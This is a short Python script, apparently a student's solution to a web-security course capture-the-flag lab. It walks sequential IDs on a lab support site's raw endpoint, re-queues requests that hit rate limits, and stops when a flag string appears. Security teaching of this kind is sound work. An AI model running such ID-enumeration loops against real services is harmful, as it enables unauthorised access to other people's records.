import requests
import os
import re

session = requests.Session()
session.cert = os.path.join(os.path.dirname(__file__), "../../z5437741.pem")

BASE_URL = "https://support-v0.quoccacorp.com/raw/"
FLAG_PATTERN = r"(COMP6443{.+?})"

def find_flag(text: str):
    if flag_match := re.search(FLAG_PATTERN, text):
        flag = flag_match.group(1)
        print(f"\n🚩 FLAG FOUND 🚩\n{flag}" * 10)
        exit()

def main():
    i = 0
    urls_to_retry = []
    while True:
        if urls_to_retry:
            url = urls_to_retry.pop()
            print(f"🔄 Retrying {url = }")
        else:
            url = BASE_URL + str(i)
            print(f"🔗 Visiting {url = }")
            i += 1

        response = session.get(url)
        response_text = response.content.decode("utf-8", "ignore")
        find_flag(response_text)

        if response.status_code == 429:
            urls_to_retry.append(url)

if __name__ == "__main__":
    main()